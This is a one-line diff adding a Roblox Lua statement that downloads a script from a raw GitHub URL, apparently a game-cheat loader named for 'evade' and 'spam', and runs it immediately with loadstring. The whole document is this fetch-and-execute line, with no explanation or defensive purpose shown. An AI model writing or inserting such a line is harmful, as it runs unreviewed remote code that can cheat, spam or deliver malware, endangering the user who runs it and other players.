@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/hlwn-evade-spam1-tethdxf7ivnzyo.lua"))()
